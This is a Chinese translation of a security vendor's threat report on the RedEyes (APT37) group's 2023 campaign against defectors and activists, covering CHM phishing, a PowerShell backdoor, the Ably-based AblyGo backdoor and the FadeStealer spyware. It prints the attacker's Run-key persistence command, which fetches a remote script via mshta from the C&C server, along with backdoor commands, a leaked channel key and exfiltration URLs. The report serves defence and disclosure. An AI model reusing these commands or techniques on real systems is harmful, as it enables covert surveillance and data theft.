**原文链接：<https://asec.ahnlab.com/en/54349/>  
译者：知道创宇404实验室翻译组 **

### 1.概述

RedEyes(也被称为APT37、ScarCruft、Reaper)是一个由国家支持的APT组织，主要针对脱北者、人权活动家、大学教授等个人进行攻击。他们的任务是监视特定个体的生活。2023年5月，AhnLab安全应急响应中心(ASEC)发现RedEyes组织部署了一个全新的、具有窃听功能的Infostealer，同时还使用了由GoLang开发、以Ably平台为载体的后门。

***Ably[1]** 是一个实时数据传输和消息传递的平台。它还可以发布/订阅消息、推送通知、进行实时查询和状态同步。

攻击者通过使用Ably服务的GoLang后门发送命令。命令通信所需的API密钥值保存在GitHub存储库中。此API密钥值对于攻击者频道通信而言是必需的，只要知道此密钥值，任何人都可以订阅该频道。因此，部分被攻击者使用的命令在分析时可以被识别出来。

ASEC旨在分享RedEyes组织在2023年5月的攻击中使用的战术、技术和程序(TTPs)。从最初的入侵技术，一直到权限升级、命令、控制以及渗透，本文涵盖了RedEyes用于监视个人信息的每个阶段。

![](https://images.seebug.org/content/images/2023/06/beceafc1-2eb1-4f44-8113-ce07aaba0660.webp-w331s)
图1.RedEyes攻击流程

### 2.分析

#### 2.1首次访问

该组织使用CHM(编译的HTML帮助文档)文件来执行他们的初始攻击。与 **今年3月份“伪装成密码文件的恶意软件被黑客分发”[2]**
事件类似，攻击者可能是通过带有普通密码保护文档，以及附有伪装成密码文件的CHM恶意软件的钓鱼邮件来接近目标用户的。换句话说，攻击者将CHM恶意软件与普通密码受保护的文档进行压缩，使用户相信必须执行CHM文件才能查看受密码保护的文档。
![](https://images.seebug.org/content/images/2023/06/31d66655-89d6-4254-8ebb-680df8e03644.webp-w331s)
图2. 诱饵文件和恶意CHM文件

当用户执行CHM文件时，他们可以看到如图3所示的密码信息。然而，如图4所示的CHM中的内部脚本代码会触发MSHTA.exe的执行，这会导致来自攻击者的C&C服务器恶意脚本也被执行。
![](https://images.seebug.org/content/images/2023/06/7c946b55-bd8c-49d5-9e95-8f47e5ac66da.webp-w331s)
图3. CHM文件内容
![](https://images.seebug.org/content/images/2023/06/4451a515-5b65-487f-a726-94a6195fbd86.webp-w331s)
图4. CHM中的脚本代码

在分析过程中获得的恶意脚本被确认为PowerShell恶意软件，它通过使用自动运行注册表项来维持持久性。它还拥有一个后门。
![](https://images.seebug.org/content/images/2023/06/f15007a0-dbff-49a1-890f-610ed565b199.webp-w331s)
图5. 从攻击者服务器下载的PowerShell脚本(后门)

在 **2023年2月的帖子“使用加密技术的HWP恶意软件”[3]**
中证实的PowerShell恶意软件具有相对简单的功能。它能够执行攻击者的命令并使用CMD.exe发送结果，以及为了持久性而注册到RUN键注册表。最近获得的PowerShell恶意软件仍然使用相同的注册表项注册来保持持久性，但是它不使用CMD.exe，而是根据C&C服务器命令执行不同的行为。这些特性如下表1所示。

命令 | 方法  
---|---  
fileinfo | 将CSV格式下指定路径下的文件列表及文件名称、文件大小、修改时间等信息发送到命令控制服务器，并删除CSV文件  
dir | 将指定路径下的文件夹进行压缩，并将压缩后的文件发送给命令与控制服务器，然后再删除该文件  
file | 上传指定文件到命令与控制服务器  
down | 将文件下载到指定路径  
regedit | 编辑注册表的特性  
task | 特性注册到任务调度器，以便每隔10分钟重复执行一次  
zip | 解压缩特定路径中的文件  
rename | 特性来更改特定文件的名称  
del | 删除指定路径下的文件  
  
表1. PowerShell后门功能

#### 2.2. 持久性

MSHTA.exe执行的恶意PowerShell脚本使用以下命令在自动运行注册表项上注册自己，即使在系统重新启动后，也允许攻击者的C&C服务器恶意脚本执行。

    
    
    New-ItemProperty -Path   
    HKCU:\Software\Microsoft\Windows\CurrentVersion\Run -Name kcJuWlrQO -Value ‘c:\windows\system32\cmd.exe /c PowerShell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass ping -n 1 -w 569782 2.2.2.2 || mshta hxxp://172.93.181[.]249/control/html/1.html’ -PropertyType String -Force;

#### 2.3. 命令与控制

攻击者通过基于GoLang的Ably平台服务的后门进行了后期攻击阶段，如权限升级、泄露和恶意软件分发。Ably平台能够实时传输数据，任何拥有通道认证密钥的人都可以访问该通道来接收消息。在分析过程中，ASEC设法得到了攻击者通道的身份验证密钥，并查看了发送给目标的一些命令。

发送时间 | 执行的命令  
---|---  
2023-05-09 10:16:16 | forfiles /p c:\programdata  
2023-05-09 10:49:47 | ren c:\programdata\wallpaper-river.jpg wallpaper-river.exe  
2023-05-09 10:49:53 | forfiles /p c:\programdata  
2023-05-09 10:50:09 | wmic OS get Caption,CSDVersion,OSArchitecture,Version  
2023-05-09 10:50:35 | c:\programdata\wallpaper-river.exe  
  
表2. 通过AblyGo后门执行的命令

此前， **KISA[4]** 和 **Sekoia[5]**
曾报道过RedEyes组织使用Ably发送命令。当时发现的基于Ably平台的GoLang后门在其二进制文件中包含身份验证密钥，如图6所示，但是在此案例中获得的后门将身份验证密钥保存在GitHub存储库中，允许动态接收身份验证密钥以进行通道通信。这样做的目的可能为了Ably
通道身份验证密钥能够经常更改，并防止第三方读取通道消息。
![](https://images.seebug.org/content/images/2023/06/4436a244-be16-465b-ba45-a0eb1f89d7a8.webp-w331s)
图6. 硬编码认证密钥信息(以前的AblyGo后门)
![](https://images.seebug.org/content/images/2023/06/495a4307-caf5-4dd6-95a5-7d8fb9658fcd.webp-w331s)
图7. 使用GitHub查找认证密钥功能 (AblyGo后门变体) (GitHub
URL:<https://raw.githubusercontent.com/thanks023/hello/main/ReadMe.txt>)

GoLang后门访问存在于其二进制中的GitHub URL，并检索“<>
base64编码的通道认证密钥”格式的数据，以获得Ably通道认证密钥。这种方法也可以在 **zscaler于2023年3月发表的“The
Unintentional Leak: A glimpse into The attack vectors of APT37”[6]**
中看到(图4)。根据这篇文章，攻击者经常用BASE64.编码的字符串来对图4中所示的字符串进行解密，从而得到Ably身份验证密钥值。

**[GitHub Commit String]**
<>S3dITXZ3LmJvaUMzdzpqR2JmMDd3VW9iN3RGanoxM1dxRFE4WJRsVFBDbVBQdldzb3hZYjFxc21r  
**[GitHub Decrypted String]**
<>KwHMvw.boiC3w:jGbf07wUob7tFjz13WqDQ8X.lTPCmPPvWsoxYb1qsmk (Ably
authentication key)

如果AblyGo后门在受感染的系统上被执行，那么它会在GitHub中检索“<>认证密钥”，随即便用图7中的代码解析“<>”来解码BASE64.后面的字符串。通过解码的身份验证密钥值可以访问攻击者的Ably通道，其中名为“UP”和“DOWN”的消息会被发送和接收。发送和接收数据的格式以及特征见表3。

消息名称（特征） | 数据格式  
---|---  
发送HELLO并上传命令结果 | {“Id”:”PC Name”,”Textdata”:”SEVMTw==”}  
发送CMD命令 | {“Id”:”PC Name”,”Textdata”:”SEVMTw==”}  
  
表3. AblyGo后门发送和接收信息的格式和特点

AblyGo在被感染的PC上执行后，便以大约2到5分钟的间隔发送用BASE64.编码的“HELLO”数据，以表示PC已连接到攻击者的Ably通道(消息名称:UP)

攻击者不仅监视Ably通道，还会对受感染PC的ID进行识别,再用BASE64.编码来命令并再次传输到PC(消息名称:DOWN)。

从C&C服务器接收到的执行命令完全通过CMD.exe完成，该CMD命令的结果用“UP”消息传回通道。换言之，攻击者用“UP”来识别受感染PC、接收命令结果，用“DOWN”来发出命令的消息。

#### 2.4 权限升级

在发布命令和控制之后，攻击者使用名为T1546.015(事件触发执行:组件对象模型劫持)的已知权限升级技术来执行其他恶意软件。如图8所示，注册到注册表项的恶意软件将无法得到保障。
![](https://images.seebug.org/content/images/2023/06/431e8449-ff94-4035-8202-4a6a5fc74233.webp-w331s)
图8. 权限升级技术（T1546.015）

#### 2.5 渗透

攻击者最终利用AblyGo后门和MSTHA PowerShell，以无文件形式来执行Infostealer。
![](https://images.seebug.org/content/images/2023/06/b9435b58-10b5-49f0-87d8-5ff186461d87.webp-w331s)
图9. FadeStealer执行流程
![](https://images.seebug.org/content/images/2023/06/48ac3083-f208-490f-af00-b90308565236.webp-w331s)
图10. AhnLab端点检测响应(EDR)的检测画面(流程树结构)

被执行的Infostealer具有各种功能，例如截图、从可移动媒体设备和智能手机中窃取数据、键盘记录和窃听。
![](https://images.seebug.org/content/images/2023/06/cb82d59a-5f10-4325-b987-7c5ed911f259.webp-w331s)
图11. 被添加到FadeStealer的窃听功能

ASEC根据泄露数据存储的文件夹名称的特点，将这种新发现的恶意软件命名为 **FadeStealer** (Fade as a
stealer)。FadeStealer在%temp%目录中为每个泄露的数据创建单独的文件夹。它利用文件内集成的RAR压缩应用程序，每隔30分钟都使用密码来压缩受感染PC泄漏的数据。FadeStealer采用了细致的拆分压缩的方式，如果压缩文件大小超过1gb，则会自动将每个文件的容量限定在1gb以内。

文件夹路径 | 泄露的信息  
---|---  
%temp%\VSTelems_Fade\NgenPdbc | 截屏  
%temp%\VSTelems_Fade\NgenPdbk | 键盘记录  
%temp%\VSTelems_Fade\NgenPdbm | 麦克风窃听  
%temp%\VSTelems_FadeIn | 智能手机设备的数据收集  
%temp%\VSTelems_FadeOut | 可移动媒体设备  
  
表4. 文件夹路径和泄露的数据  
![](https://images.seebug.org/content/images/2023/06/bdcce823-b824-4363-adad-ec97d5ab2a77.webp-w331s)

图12. AhnLab EDR(利用RAR压缩工具窃取信息)的检测画面

压缩项 | 方法说明  
---|---  
a | 添加到压缩文件  
r | 恢复压缩文件  
ep1 | 从名称中删除基目录  
m0 | 设置压缩级别(保存)  
y | 对所有问题自动回答“是”  
p NaeMhq[d]q | 设置压缩密码为NaeMhq[d]q  
v1g | 将压缩卷限制设置为1gb  
  
表5. 压缩选项  
![](https://images.seebug.org/content/images/2023/06/c72bdcae-2e91-46f4-9ef6-6adf4eb4db99.webp-w331s)

图13. 在威胁行为者的服务器上发现的被盗的个人信息

### 3.总结

RedEyes组织的攻击对象是脱北者、人权运动家、大学教授等特定群体，他们的主要目标是窃取信息。在最近的这次攻击中，ASEC团队发现了一个具有窃听麦克风功能的Infostealer。在韩国，未经授权对个人进行窃听的行为被视为侵犯他人隐私，并受到法律的严格管制。尽管如此，黑客还是监控了受害者在电脑上的一举一动，甚至进行了窃听。

如果您对本案例的整个攻击流程进行检验，就会发现攻击者巧妙而精确地完成了攻击：通过钓鱼邮件访问目标系统并使用Ably通道作为命令和控制服务器，这类攻击很难被个人察觉。ASEC正在密切跟踪RedEyes的行动，并迅速对其作出反应，防止损失扩大。

用户要避免打开来历不明的文件，以防黑客入侵，近期尤为如此。该组织最近一直在使用基于CHM和LNK扩展名的恶意软件来执行他们初始入侵。在运行电子邮件附件时，应该特别注意文件扩展名名称。文件扩展名默认设置为隐藏，建议参考图14，取消勾选“隐藏已知文件类型的扩展名”。如果附加文件的后缀名是CHM或LNK，那么在执行它们之前验证电子邮件的来源是至关重要的。

![](https://images.seebug.org/content/images/2023/06/b0d50fa3-41d2-47f9-804f-d523a112af73.webp-w331s)
图14. 取消选中“隐藏已知文件类型的扩展名"

### 4.参考文献

[1][Ably](https://ably.com/)  
[2][Malware Distributed Disguised as a Password
File](https://asec.ahnlab.com/en/49760/)  
[3] [HWP Malware Using the Steganography Technique: RedEyes
(ScarCruft)](https://asec.ahnlab.com/en/48063/)  
[4] [TTPs $ ScarCruft Tracking Note – KISA](https://thorcert.notion.site/TTPs-ScarCruft-Tracking-Note-67acee42e4ba47398183db9fc7792aff)  
[5][Peeking at Reaper’s surveillance operations –
sekoia](https://blog.sekoia.io/peeking-at-reaper-surveillance-operations-against-north-korea-defectors/)  
[6] [The Unintentional Leak: A glimpse into the attack vectors of APT37 –
zscaler](https://www.zscaler.com/blogs/security-research/unintentional-leak-glimpse-attack-vectors-apt37)

**[IOC]  
[MD5]  
[CHM]**  
1352abf9de97a0faf8645547211c3be7

**[Powershell Backdoor]**  
1c1136c12d0535f4b90e32aa36070682

**[AblyGo Variant]**  
msedgeupdate.ini (3277e0232ed6715f2bae526686232e06)  
msedgeupdate.ini (3c475d80f5f6272234da821cc418a6f7)

**[Dll Sideloading – Loader]**  
mfc42u.dll (59804449f5670b4b9b3b13efdb296abb)

**[FadeStealer]**  
DESKTOP.lNl (f44bf949abead4af0966436168610bcc)

**[File Detection]**  
Trojan/Win.Goably.C5436296 (2023.06.03.00)  
Trojan/Win.Goably.C5422375 (2023.05.09.02)  
Trojan/Win.Loader.C5424444 (2023.05.09.02)  
Data/BIN.RedEyes (2023.06.08.01)  
Downloader/CHM.Generic (2023.06.02.03)  
Downloader/PowerShell.Generic (2023.06.06.00)

**[Behavior Detection]**  
Injection/EDR.Event .M11124

**[Exfiltrated Data Save URL]**  
hxxp://172.93.181[.]249/control/data/

**[AblyGo Backdoor Upload Path]**  
hxxp://172.93.181[.]249/file/

**[PowerShell Backdoor Download URL After Initial Breach Stage]**  
hxxp://172.93.181[.]249/control/html/1.html

* * *

![Paper](https://images.seebug.org/content/images/2017/08/0e69b04c-e31f-4884-8091-24ec334fbd7e.jpeg)
本文由 Seebug Paper 发布，如需转载请注明来源。本文地址：<https://paper.seebug.org/2086/>

